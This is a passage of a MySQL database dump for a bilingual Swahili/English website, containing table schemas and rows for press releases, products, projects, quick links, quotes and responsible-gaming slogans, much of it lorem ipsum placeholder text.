INSERT INTO `press_releases` VALUES (3,'Likizo imekaribia kona','Holiday is around the corner','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;</p>','<p>Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;Mapitio Ya Kikao Kazi Cha Utendaji Wa TNBC&nbsp;</p>','/uploads/press_releases/en1627887149-PROVISIONAL SITE MAP.xlsx','/uploads/press_releases/sw1627887149-PROVISIONAL SITE MAP.xlsx',1,'holiday-is-around-the-corner',1,'2021-08-02 03:52:30','2021-08-02 03:52:30'),(4,'AWARDED CONTRACTS 2020-2021','AWARDED CONTRACTS 2020-2021','<p><a href=\"https://tira.go.tz/content/awarded-contracts-2020-2021\">AWARDED CONTRACTS 2020-2021</a></p>','<p><a href=\"https://tira.go.tz/content/awarded-contracts-2020-2021\">AWARDED CONTRACTS 2020-2021</a></p>','/uploads/press_releases/en1627887240-INSTITUTE OF CONSTRUCTION TECHNOLOGY Website.docx','/uploads/press_releases/sw1627887240-INSTITUTE OF CONSTRUCTION TECHNOLOGY Website.docx',1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc',1,'2021-08-02 03:54:00','2022-08-07 11:02:53'),(5,'AWARDED CONTRACTS 2021-2022 semi annual','AWARDED CONTRACTS 2021-2022 semi annual','<p><a href=\"https://tira.go.tz/content/awarded-contracts-2021-2022-semi-annual\">AWARDED CONTRACTS 2021-2022 semi annual</a></p>','<p><a href=\"https://tira.go.tz/content/awarded-contracts-2021-2022-semi-annual\">AWARDED CONTRACTS 2021-2022 semi annual</a></p>','/uploads/press_releases/en1659880909-AWARDED CONTRACTS 2021-2022 semi annual.pdf','/uploads/press_releases/sw1659880909-AWARDED CONTRACTS 2021-2022 semi annual.pdf',1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-2',1,'2021-08-02 04:04:15','2022-08-07 11:01:49');
/*!40000 ALTER TABLE `press_releases` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `product_categories`
--

DROP TABLE IF EXISTS `product_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `product_categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `product_categories`
--

LOCK TABLES `product_categories` WRITE;
/*!40000 ALTER TABLE `product_categories` DISABLE KEYS */;
INSERT INTO `product_categories` VALUES (2,'Tools and Equipments','Vifaa vya kitabibu','Tools and Equipments','Vifaa vya kitabibu','/uploads/product-categories/7f74f6a100ab66cb50dea85e562f3b66.jpeg',1,'tools-and-equipments','2022-01-09 06:00:56','2022-01-09 06:00:56'),(3,'Pain Killers','Dawa za Kupunguza Makali','Pain Killers Summary here','Dawa za Kupunguza Makali zinapatikana','/uploads/product-categories/58119d1f984a049ea85942769c330500.jpeg',1,'pain-killers','2022-01-09 08:40:22','2022-01-09 08:40:22');
/*!40000 ALTER TABLE `product_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `products`
--

DROP TABLE IF EXISTS `products`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `products` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `price` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_id` int(11) NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `products`
--

LOCK TABLES `products` WRITE;
/*!40000 ALTER TABLE `products` DISABLE KEYS */;
INSERT INTO `products` VALUES (4,'Scissors','Mkasi','Scissors','Mkasi',NULL,NULL,'10000','/uploads/products/0d1eba692467e4ee491e0974d871223d.jpeg',2,1,'scissors','2022-01-09 06:05:22','2022-01-09 06:14:03'),(5,'X-ray Machine','Machine ya X-ray','An X-ray machine is any machine that involves X-rays. It may consist of an X-ray generator and an X-ray detector.','An X-ray machine is any machine that involves X-rays. It may consist of an X-ray generator and an X-ray detector.','<h2>What is Lorem Ipsum?</h2>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<h2>Why do we use it?</h2>\r\n\r\n<p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using &#39;Content here, content here&#39;, making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for &#39;lorem ipsum&#39; will uncover many web sites still in their infancy. Various versions have evolved over the years, sometimes by accident, sometimes on purpose (injected humour and the like).</p>','<h2>What is Lorem Ipsum?</h2>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<h2>Why do we use it?</h2>\r\n\r\n<p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters, as opposed to using &#39;Content here, content here&#39;, making it look like readable English. Many desktop publishing packages and web page editors now use Lorem Ipsum as their default model text, and a search for &#39;lorem ipsum&#39; will uncover many web sites still in their infancy. Various versions have evolved over the years, sometimes by accident, sometimes on purpose (injected humour and the like).</p>','5000','/uploads/products/515cc8f8fc408e148faf3ae3442c1671.jpeg',2,1,'x-ray-machine','2022-01-09 06:05:22','2022-01-09 14:21:47');
/*!40000 ALTER TABLE `products` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `projects`
--

DROP TABLE IF EXISTS `projects`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `projects` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` int(11) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `projects`
--

LOCK TABLES `projects` WRITE;
/*!40000 ALTER TABLE `projects` DISABLE KEYS */;
INSERT INTO `projects` VALUES (2,'Majengo ya Wizara','Ministry Building',NULL,NULL,'<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>','4559c6f8c4da7ec78768c52ab65ed292.jpeg',1,'ministry-building',0,'2021-10-14 03:48:28','2021-10-14 03:48:28'),(3,'GePG','GePG',NULL,NULL,'<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>','<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>\r\n\r\n<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor&quot; elit, sed do eiusmod tempor,o eiusmod tempor&nbsp;</p>','0f709d14af202ed8701e4e3f304be049.jpeg',1,'gepg',0,'2021-10-14 03:50:51','2021-10-14 03:50:51');
/*!40000 ALTER TABLE `projects` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quick_infos`
--

DROP TABLE IF EXISTS `quick_infos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `quick_infos` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `info_en` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `info_sw` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `user_id` int(11) NOT NULL,
  `url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quick_infos`
--

LOCK TABLES `quick_infos` WRITE;
/*!40000 ALTER TABLE `quick_infos` DISABLE KEYS */;
INSERT INTO `quick_infos` VALUES (2,'Cheza kwa busara na kwa kujali','Cheza kwa busara na kwa kujali',1,1,'','cheza-kwa-busara-na-kwa-kujali','2022-03-10 08:21:52','2022-03-10 08:21:52'),(3,'Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani','Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani',1,1,'','michezo-ya-kubahatisha-siyo-mbadala-wa-ajira-walachanzo-cha-mapato-bali-ni-sehemu-ya-burudani','2022-03-10 08:22:22','2022-03-10 08:22:22'),(4,'Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani','Michezo ya kubahatisha siyo mbadala wa ajira walachanzo cha mapato bali ni sehemu ya burudani',1,1,'','michezo-ya-kubahatisha-siyo-mbadala-wa-ajira-walachanzo-cha-mapato-bali-ni-sehemu-ya-burudani-2','2022-03-10 08:22:22','2022-03-10 08:22:22');
/*!40000 ALTER TABLE `quick_infos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quick_links`
--

DROP TABLE IF EXISTS `quick_links`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `quick_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` tinyint(1) NOT NULL DEFAULT '0',
  `url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `url_external` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `parent` int(11) NOT NULL DEFAULT '0',
  `position` int(11) NOT NULL DEFAULT '1',
  `category_id` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quick_links`
--

LOCK TABLES `quick_links` WRITE;
/*!40000 ALTER TABLE `quick_links` DISABLE KEYS */;
INSERT INTO `quick_links` VALUES (1,'Mission and Vision','Mission and Vision',1,'pages/mission-and-vision',NULL,1,'2021-07-28 06:21:55','2022-08-10 02:01:54',0,3,0),(3,'Contact Details','Contact Details',1,'contacts',NULL,1,'2021-07-28 06:22:24','2022-08-10 02:01:54',0,2,0),(4,'FAQs','FAQs',1,'faqs',NULL,1,'2021-07-28 06:22:34','2022-08-10 02:01:54',0,4,0),(5,'Home','Home',1,'#',NULL,1,'2021-07-28 06:22:43','2022-08-10 02:01:54',0,1,0),(6,'What we Do?','What we Do?',1,'pages/what-we-do',NULL,1,'2022-08-10 02:00:44','2022-08-10 02:02:04',0,5,0),(7,'Who we Are?','Who we Are?',1,'pages/who-we-are',NULL,1,'2022-08-10 02:01:03','2022-08-10 02:02:16',0,6,0),(8,'Who we Serve?','Who we Serve?',1,'pages/who-we-serve',NULL,1,'2022-08-10 02:01:34','2022-08-10 02:02:29',0,7,0);
/*!40000 ALTER TABLE `quick_links` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quicklink_categories`
--

DROP TABLE IF EXISTS `quicklink_categories`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `quicklink_categories` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quicklink_categories`
--

LOCK TABLES `quicklink_categories` WRITE;
/*!40000 ALTER TABLE `quicklink_categories` DISABLE KEYS */;
/*!40000 ALTER TABLE `quicklink_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quotes`
--

DROP TABLE IF EXISTS `quotes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `quotes` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `user_id` int(11) NOT NULL,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quotes`
--

LOCK TABLES `quotes` WRITE;
/*!40000 ALTER TABLE `quotes` DISABLE KEYS */;
INSERT INTO `quotes` VALUES (3,'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika','Changes in Second Stakeholders General Meetings and more','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;</p>','<p>Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;&nbsp;Changes in Second Stakeholders General Meeting&nbsp;Changes in Second Stakeholders General Meeting&nbsp;</p>',1,1,'changes-in-second-stakeholders-general-meeting-2','efd8652e33a4858bc5fb87f1e0deadae','2021-09-02 02:58:21','2022-06-22 03:52:35'),(4,'Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika','Changes in Second Stakeholders General Meetings','',NULL,'<p>Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili Wa Wadau Na Washirika&nbsp;&nbsp;Mabadiliko Ya Ratiba Ya Mkutano Wa Pili 